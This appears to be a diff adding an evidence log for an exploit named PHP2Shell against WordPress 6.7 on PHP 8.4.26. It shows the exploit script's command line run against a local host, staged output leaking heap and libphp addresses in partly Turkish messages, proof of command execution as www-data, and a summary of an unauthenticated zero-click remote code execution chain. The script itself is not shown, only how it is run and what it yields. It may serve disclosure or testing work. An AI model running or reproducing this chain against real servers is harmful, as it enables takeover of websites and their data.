@@ -1,0 +1,32 @@
+============================================================
+ PHP2Shell - WordPress RCE Evidence
+ Date: 22 October 2026
+ Target: WordPress 6.7 / PHP 8.4.26 / Apache mod_php
+============================================================
+
+Command: python3 exploit/php2shell_exploit.py -u http://127.0.0.1:9080/index.php -c "id>/out/p" --target-os linux
+
+--- OUTPUT ---
+
+[*] Hedef: http://127.0.0.1:9080/index.php
+[*] OS: LINUX
+[*] Komut: 'id>/out/p'
+[*] Offset'ler: zif=0x465370 dtor=0x65EB60 htdata=0x690D8
+[*] rotating worker
+[*] Stage 1: heap leak (1/3)
+[+] Zend MM chunk base = 0x7242f2400000
+[*] rotating worker
+[*] Stage 2: libphp leak (1/3)
+[+] libphp base = 0x7242f40d1000
+[*] rotating worker
+[*] Stage 3: HTDATA=0x7242f24690d8 zif_system=0x7242f4536370
+[+] Komut calisti (attempt 1)
+
+PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+--- ANALYSIS ---
+
+- Unauthenticated: No login, no cookie, no session_start() required
+- 0-click: Single POST to /index.php is sufficient
+- Chain: Bug 2 (memory disclosure) -> Bug 1 (stale session global) -> system()
+- Impact: Full code execution as www-data (Apache worker user)
